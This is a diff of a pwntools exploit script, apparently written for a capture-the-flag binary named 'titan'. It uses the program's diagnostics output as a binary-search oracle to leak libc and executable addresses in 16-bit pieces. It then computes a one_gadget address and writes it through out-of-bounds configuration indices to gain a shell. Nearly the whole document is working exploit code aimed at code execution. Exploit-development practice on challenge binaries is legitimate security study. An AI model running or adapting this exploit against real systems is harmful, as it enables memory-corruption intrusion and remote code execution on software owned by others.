@@ -1,107 +1,130 @@
 #!/usr/bin/env python3
 
+from asyncio import log
 from pwn import *
 
 exe = ELF("./titan")
-#libc = ELF("./libc-2.31.so")
+libc = ELF("./libc-2.31.so")
 #ld = ELF("./ld-2.31.so")
 
 context.binary = exe
 
+b =  "b * run_diagnostics+0x0398 b *update_config+0x0310"
 
 def conn():
     if args.LOCAL:
         r = process([exe.path])
         if args.DEB:
-            gdb.attach(r, gdbscript="""b *update_config+0x0310
-                       b *run_diagnostics+0x0398
-                       delete 0
-                       delete 1
+            gdb.attach(r, gdbscript="""
+                        c
                        """)
     else:
         r = remote("addr", 1337)
 
     return r
 
+def to_signed16_arith(val):
+    if isinstance(val, (bytes, bytearray)):
+        val = int(val)
+    return (val + 2**15) % 2**16 - 2**15
+
+def to_unsigned16_arith(val):
+    if isinstance(val, (bytes, bytearray)):
+        val = int(val)
+    return val & 0xFFFF
+
 def update(r, target, target_val , name = b"NONE"):
+    r.recvuntil(b": ")
     r.sendline(b"2")
     r.sendline(target)
+    r.recvuntil(b"upper boundry")
     if target != b"0":
-        r.sendline(target_val)
+        r.sendline(str(target_val).encode())
+    r.recvuntil(b"Update titan serial number?")
+    
     if name == b"NONE":
         r.sendline(b"n")
     else:
         r.sendline(b"y")
         r.sendline(name)
+        
 
 def run_diagnostics(r, val):
     r.sendline(b"3")
     r.recvuntil(b"(0-2): ")
     r.sendline(val)
 
-def leak_address(r, addr_val):
-    current_addr = addr_val
-    leak = 0
-    for j in range(255):
-        for i in range(255):
-            cur_check = j << 8 | i
-            update(r, b"1", str(cur_check).encode())
-            run_diagnostics(r, current_addr)
-            diagnostics = r.recvuntil(b": ")
-            print(f"Trying {hex(cur_check)}")
-            print(diagnostics)
-            if b"Systems OK!" in diagnostics:
-                leak = i
-                exit(0)
-    return leak
-
-def binary_search_16bit(r, current_addr, low=0, high=0xFFFF):
+def binary_search_16bit(r, current_addr, low=-32768, high=32767):
     while low <= high:
         mid = (low + high) // 2
-        update(r, b"1", str(mid).encode())
-        update(r, b"2", str(mid).encode())
+        update(r, b"1", mid)
+        update(r, b"2", mid)
         run_diagnostics(r, current_addr)
-        diagnostics = r.recvuntil(b"WARNING", timeout=5)
+        diagnostics = r.recvuntil(b"Diagnose core temperature\n")
+
         diagnostics = r.recvline()
-        print(f"Trying {hex(mid)}")
-        #print(diagnostics)
-        #r.interactive() 0x9578
-        #exit(0)
+    
         if b"Systems OK!" in diagnostics:
             print(f"Found value: {mid} (0x{mid:04x})")
-            return mid
+            return to_unsigned16_arith(mid)
 
-        if b"Low values detected!" in diagnostics:
-            high = mid - 1
-            continue
-
-        if b"High values detected!" in diagnostics:
+        if b"High" in diagnostics:
             low = mid + 1
             continue
 
-        return mid
-    return mid
+        if b"Low" in diagnostics:
+            high = mid - 1
+            continue
+
 
 
 def main():
     r = conn()
 
-    #update(r, b"167", str(0xaaaa).encode(), b"A"*10)
-    #run_diagnostics(r, b"161")
-    num = -998
-    numarr = [0,0,0,0]
-    binary_search_16bit(r, str(num).encode())
-    r.interactive()
-    exit(0)
-    for i in range(0,3):
-        numarr[i] = binary_search_16bit(r, str(num - i).encode())
-    print(numarr[0])
-    print(numarr[1])
-    print(numarr[2])
-    print(numarr[3])
-    leak = numarr[0]<<24 | numarr[1]<<16 | numarr[2]<<8 | numarr[3]
-    log.success(f"Leaked address: {hex(leak)}")
 
+    num = 245
+    numarr = [0,0,0,0]
+    numarr[0] = binary_search_16bit(r, b"245")
+    print(hex(numarr[0]))
+    numarr[1] = binary_search_16bit(r, b"246")
+    print(hex(numarr[1]))
+    numarr[2] = binary_search_16bit(r, b"247")
+    print(hex(numarr[2]))
+    numarr[3] = binary_search_16bit(r, b"248")
+    print(hex(numarr[3]))
+    leak = numarr[3]<<48 | numarr[2]<<32 | numarr[1]<<16 | numarr[0]
+                
+    offset = 0x742fd3a29e40 - 0x0000742fd3a00000
+    libc.address = leak - offset
+    one_gadget = libc.address + 0xe3afe
+    libc_malloc_hook = libc.symbols['__malloc_hook']
+    log.success(f"Leaked libc address: {hex(leak)}")
+    log.success(f"Libc base address: {hex(libc.address)}")
+    log.success(f"One gadget address: {hex(one_gadget)}")
+    log.success(f"libc_malloc_hook address: {hex(libc_malloc_hook)}")
+
+    numarr = [0,0,0,0]
+    numarr[0] = binary_search_16bit(r, b"269")
+    print(hex(numarr[0]))
+    numarr[1] = binary_search_16bit(r, b"270")
+    print(hex(numarr[1]))
+    numarr[2] = binary_search_16bit(r, b"271")
+    print(hex(numarr[2]))
+    numarr[3] = binary_search_16bit(r, b"272")
+    print(hex(numarr[3]))
+    leak = numarr[3]<<48 | numarr[2]<<32 | numarr[1]<<16 | numarr[0]
+    offset = 0x5a13e0c023c0 - 0x00005a13e0c00000
+    exe.address = leak - offset
+    log.success(f"Leaked exe address: {hex(leak)}")
+    log.success(f"Exe base address: {hex(exe.address)}")
+    titan_offset = 0x565b28519020 - 0x0000565b28512000
+    titan_addr = exe.address + titan_offset
+    log.success(f"Titan struct address: {hex(titan_addr)}")
+
+    update(r, b"213", to_signed16_arith(one_gadget & 0xFFFF))
+    update(r, b"214", to_signed16_arith((one_gadget >> 16) & 0xFFFF))
+    update(r, b"215", to_signed16_arith((one_gadget >> 32) & 0xFFFF))
+    update(r, b"216", to_signed16_arith((one_gadget >> 48) & 0xFFFF))
     r.interactive()
 
 
